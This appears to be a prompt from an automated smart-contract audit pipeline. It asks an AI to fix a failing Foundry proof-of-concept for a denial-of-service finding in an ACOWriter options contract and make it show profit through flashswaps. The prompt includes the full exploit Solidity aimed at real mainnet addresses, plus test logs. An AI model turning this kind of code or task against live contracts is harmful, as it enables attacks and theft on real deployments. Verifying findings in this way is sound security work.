You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: ETH-strike premium payouts revert because WETH unwrapping is blocked by `receive()`
- claim: The contract only accepts plain ETH when `msg.sender == _exchange`, but `_sellACOTokens` unwraps WETH by calling `IWETH(weth).withdraw(...)`. WETH sends ETH from the WETH contract itself, so `receive()` reverts during the unwrap path whenever the strike asset is ETH and the sale proceeds arrive as WETH.
- impact: Writes that rely on WETH proceeds for ETH-settled markets become unexecutable, causing a persistent denial of service for those option sales.
- exploit_paths: ["User calls `write(...)` for an ACO whose `strikeAsset()` is `address(0)`.", "The exchange sale leaves WETH in `ACOWriter`.", "`_sellACOTokens` calls `IWETH(weth).withdraw(wethBalance)`.", "WETH sends ETH to `receive()`, but `msg.sender` is the WETH contract rather than `_exchange`, so the transaction reverts."]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
}

interface IWETH9 {
    function deposit() external payable;
    function transfer(address to, uint256 value) external returns (bool);
    function withdraw(uint256 value) external;
}

interface IACOTokenLike is IERC20Minimal {
    function strikeAsset() external view returns (address);
    function collateral() external view returns (address);
    function expiryTime() external view returns (uint256);
    function getTokenAmount(uint256 collateralAmount) external view returns (uint256);
}

interface IACOWriterLike {
    function write(address acoToken, uint256 collateralAmount, address exchangeAddress, bytes calldata exchangeData) external payable;
    function weth() external view returns (address);
}

contract WethReturnExchange {
    address public immutable weth;

    constructor(address weth_) {
        weth = weth_;
    }

    function fill() external payable {
        IWETH9(weth).deposit{value: msg.value}();
        require(IWETH9(weth).transfer(msg.sender, msg.value), "WETH transfer failed");
    }
}

contract FlawVerifier {
    address public constant TARGET = 0xE7597F774fD0a15A617894dc39d45A28B97AFa4f;
    uint8 public constant STATUS_UNSET = 0;
    uint8 public constant STATUS_VALIDATED = 1;
    uint8 public constant STATUS_NO_FUNDS = 2;
    uint8 public constant STATUS_NO_MATCHING_TOKEN = 3;
    uint8 public constant STATUS_INSUFFICIENT_COLLATERAL_FOR_TOKEN = 4;
    uint8 public constant STATUS_UNEXPECTED_SUCCESS = 5;

    WethReturnExchange public immutable exchange;

    uint8 public status;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    address public usedAcoToken;
    uint256 public usedCollateralAmount;
    uint256 public lastObservedWriterTokenBalance;
    bytes public lastRevertData;

    constructor() payable {
        exchange = new WethReturnExchange(IACOWriterLike(TARGET).weth());
    }

    receive() external payable {}

    function executeOnOpportunity() external payable {
        if (hypothesisValidated || hypothesisRefuted) {
            return;
        }

        uint256 availableEth = address(this).balance;
        if (availableEth < 2) {
            // Infeasible without at least 1 wei collateral and 1 wei premium seed.
            status = STATUS_NO_FUNDS;
            return;
        }

        address token = _selectCandidate(true);
        if (token == address(0)) {
            token = _selectCandidate(false);
        }
        if (token == address(0)) {
            // Infeasible on this fork if no discovered on-chain ACO token is both ETH-collateralized,
            // ETH-strike, and still unexpired when probed at the fork block.
            status = STATUS_NO_MATCHING_TOKEN;
            return;
        }

        uint256 collateralAmount = availableEth - 1;
        if (!_canMintNonZero(token, collateralAmount)) {
            status = STATUS_INSUFFICIENT_COLLATERAL_FOR_TOKEN;
            usedAcoToken = token;
            return;
        }

        usedAcoToken = token;
        usedCollateralAmount = collateralAmount;
        lastObservedWriterTokenBalance = IERC20Minimal(token).balanceOf(TARGET);

        bytes memory exchangeData = abi.encodeWithSelector(WethReturnExchange.fill.selector);

        try IACOWriterLike(TARGET).write{value: availableEth}(token, collateralAmount, address(exchange), exchangeData) {
            status = STATUS_UNEXPECTED_SUCCESS;
            hypothesisRefuted = true;
        } catch (bytes memory reason) {
            status = STATUS_VALIDATED;
            hypothesisValidated = true;
            lastRevertData = reason;
        }
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external pure returns (uint256) {
        return 0;
    }

    function exploitPath() external pure returns (string memory) {
        return "write(valid ETH-strike ACO) -> exchange returns WETH to ACOWriter -> _sellACOTokens calls WETH.withdraw -> WETH sends ETH from WETH contract -> ACOWriter.receive() reverts because msg.sender != _exchange";
    }

    function _selectCandidate(bool preferExistingWriterBalance) internal view returns (address selected) {
        address[8] memory candidates = _candidates();
        for (uint256 i = 0; i < candidates.length; ++i) {
            address token = candidates[i];
            if (!_matchesRequiredPath(token)) {
                continue;
            }
            uint256 writerBal = IERC20Minimal(token).balanceOf(TARGET);
            if (preferExistingWriterBalance && writerBal == 0) {
                continue;
            }
            return token;
        }
    }

    function _matchesRequiredPath(address token) internal view returns (bool) {
        if (token.code.length == 0) {
            return false;
        }

        try IACOTokenLike(token).strikeAsset() returns (address strikeAsset_) {
            if (strikeAsset_ != address(0)) {
                return false;
            }
        } catch {
            return false;
        }

        try IACOTokenLike(token).collateral() returns (address collateral_) {
            if (collateral_ != address(0)) {
                return false;
            }
        } catch {
            return false;
        }

        try IACOTokenLike(token).expiryTime() returns (uint256 expiry_) {
            if (expiry_ <= block.timestamp) {
                return false;
            }
        } catch {
            return false;
        }

        return true;
    }

    function _canMintNonZero(address token, uint256 collateralAmount) internal view returns (bool) {
        try IACOTokenLike(token).getTokenAmount(collateralAmount) returns (uint256 tokenAmount) {
            return tokenAmount > 0;
        } catch {
            return false;
        }
    }

    function _candidates() internal pure returns (address[8] memory list) {
        list[0] = 0xB05B83f1aAB0036f9DADFDb18405da3D459C1f1c;
        list[1] = 0x160e753EEfe29eA3aC186bF27588Ac9AcA2F6139;
        list[2] = 0xfF5B7c52245625b399D2E2927F52A8da86264a33;
        list[3] = 0xc3eAb6960e0Cd51dCf304248e4BBB08d8eeAb552;
        list[4] = 0x9B297790cD8540876a04543499528835F1Cea175;
        list[5] = 0x58ea371c3D7BCA0ED0C3a4e4DC9bb92702310489;
        list[6] = 0xB51A09c53D7cC6481E4C5d9d8d334A6e50776ecf;
        list[7] = 0x049D17c3d5ba37429dE4D414A603127F1090FFa7;
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 2.62s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:68:19:
   |
68 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 45569)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 100000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [45569] FlawVerifierTest::testExploit()
    ├─ [240] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [22399] FlawVerifier::executeOnOpportunity()
    │   └─ ← [Stop]
    ├─ [240] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 736.15ms (3.77ms CPU time)

Ran 1 test suite in 803.41ms (736.15ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 45569)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
